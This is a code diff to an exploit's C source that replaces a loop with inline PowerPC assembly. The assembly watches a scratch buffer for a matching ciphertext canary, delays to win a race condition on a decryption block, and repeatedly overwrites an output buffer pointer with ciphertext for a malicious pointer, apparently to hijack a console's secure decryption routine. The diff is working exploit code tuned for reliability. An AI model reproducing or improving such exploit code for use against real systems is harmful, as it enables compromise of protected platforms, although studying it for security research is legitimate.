@@ -673,26 +673,67 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
 
 static void CiphertextOverwriteLoop(void *pScratchPtr, CIPHER_TEXT_DATA *pCipherTextData)
 {
-    void *addr;
-    ULONGLONG *canaries, *replacements, *replacements2, tmp;
+    ULONGLONG *canaries, *replacements, *replacements2;
 
-    addr = pScratchPtr;
     canaries = pCipherTextData->canaries;
     replacements = pCipherTextData->replacements;
     replacements2 = pCipherTextData->replacements2;
 
-    __dcbf(0, addr);
+    int delayCount = 1500000, writeCount = 100000;
 
-    for (;;) {
-        tmp = *(ULONGLONG *) addr;
-        if (tmp != 0 && canaries[tmp >> (64 - HASH_BITS)] == tmp) {
-            for (int i = 0; i < 100000; i++) {
-                *(ULONGLONG *) ((char *) addr + 0x2B20) = replacements[tmp >> (64 - HASH_BITS)];
-                *(ULONGLONG *) ((char *) addr + 0x2B28) = replacements2[tmp >> (64 - HASH_BITS)];
-                __dcbst(0x2B20, addr);
-            }
-        }
-        __dcbf(0, addr);
+    _asm
+    {
+        // Preload registers with all the pointers and constants we'll need during the attack loop. We want to minimize
+        // any additional operations done to make the loop as tight as possible.
+        mr      r31, pScratchPtr
+        mr      r30, canaries
+        mr      r29, replacements
+        mr      r28, replacements2
+        addi    r26, r31, 0x2B00
+        mr      r25, writeCount
+        mr      r24, delayCount
+
+        dcbf    r0, r31
+
+    loop:
+        // Load the ciphertext from the scratch buffer header and check if it is zero (we are not hitting a valid XKE run).
+        ld      r11, 0(r31)
+        cmplwi  r11, 0
+        beq     flush
+
+        // Calculate the index into the lookup table.
+        extrdi  r10, r11, HASH_BITS, 0
+        sldi    r10, r10, 3
+
+        // Check if it matches the corresponding entry in the canary array of the lookup table.
+        ldx     r9, r30, r10
+        cmpld   cr6, r11, r9
+        bne     cr6, flush
+
+            // Delay for a number of cycles to increase the chance of winning the race condition on block 14.
+            mtctr   r24
+    delay:
+            nop
+            bdnz    delay
+
+            // Scratch buffer header ciphertext matched the entry in the canary array of the lookup table,
+            // and we have now delayed for an appropriate number of cycles. Now load its replacement from
+            // the replacement arrays, and hammer the dec_output_buffer pointer with the cipher text for
+            // our malicious pointer.
+            mtctr   r25
+            ldx     r9, r29, r10
+            ldx     r8, r28, r10
+
+    overwrite:
+            std     r9, 0x20(r26)
+            std     r8, 0x28(r26)
+            dcbst   r0, r26
+            bdnz    overwrite
+
+    flush:
+        // Flush cache on the scratch buffer so the next time we check the cipher text we fetch the data from main memory.
+        dcbf    r0, r31
+        b       loop
     }
 }
 
